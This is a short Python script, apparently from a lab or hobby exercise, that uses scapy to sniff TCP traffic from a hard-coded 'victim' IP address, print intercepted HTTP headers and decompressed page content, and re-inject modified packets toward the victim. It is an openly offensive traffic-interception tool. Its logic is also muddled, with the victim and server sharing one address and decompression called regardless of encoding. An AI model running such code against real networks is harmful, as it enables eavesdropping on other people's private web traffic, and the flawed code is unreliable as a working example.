from scapy.all import sniff, send, PPI_DOT11COMMON, Raw
from scapy.layers.inet import IP, TCP
from scapy.layers.http import HTTPRequest, HTTPResponse
from scapy.layers.dot11 import Dot11, Dot11WEP
import WEP_sniffer
from time import sleep
import zlib
import gzip
import shutil


# Define the victim's IP address
victim_ip = "192.168.3.104"
webserver_ip = "192.168.3.104"

def get_charset(http_headers):
    for header in http_headers.split('\r\n'):
        if 'Content-Type:' in header:
            if 'charset=' in header:
                return header.split('charset=')[-1].strip()
    return 'utf-8'  # Default to utf-8 if not specified


def decompress_content(content, encoding):
    if encoding == 'gzip':
        return zlib.decompress(content, 16+zlib.MAX_WBITS)
    elif encoding == 'deflate':
        return zlib.decompress(content)
    return content



def packet_callback(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP) and packet[IP].src == victim_ip and packet[IP].dst == '192.168.3.104':
        print(f"Captured packet from {victim_ip} to {packet[IP].dst}")
        if packet.haslayer(Raw):
            try:
                payload = packet[Raw].load
                http_headers = payload.decode('utf-8', errors='ignore')
                print(f"HTTP Headers:\n{http_headers}")

                # Extract the charset and content encoding.
                charset = get_charset(http_headers)
                content_encoding = None

                # Check for Content-Encoding header
                for header in http_headers.split('\r\n'):
                    if 'Content-Encoding:' in header:
                        print("OKe")
                        content_encoding = header.split('Content-Encoding:')[-1].strip()

                # Extract the HTTP body
                body_start = payload.find(b'\r\n\r\n') + 4
                body = payload[body_start:]

                # Decompress if necessary
                '''if content_encoding:
                    body = decompress_content(body, content_encoding)'''
                body = decompress_content(body, content_encoding)

                # Decode the body with the correct charset
                html_content = body.decode(charset, errors='ignore')
                print(f"HTTP Response Content:\n{html_content}")
            except Exception as e:
                print(f"Error decoding packet load: {e}")

        # Modify the packet's destination to the victim's IP
        packet[IP].dst = victim_ip

        packet.show()

        # Send the modified packet back to the victim
        send(packet)
        print(f"Forwarded packet back to {victim_ip}")

# Sniff HTTP packets and use packet_callback to process them
sniff(filter=f"ip src {victim_ip}", prn=packet_callback, store=0, timeout=20)



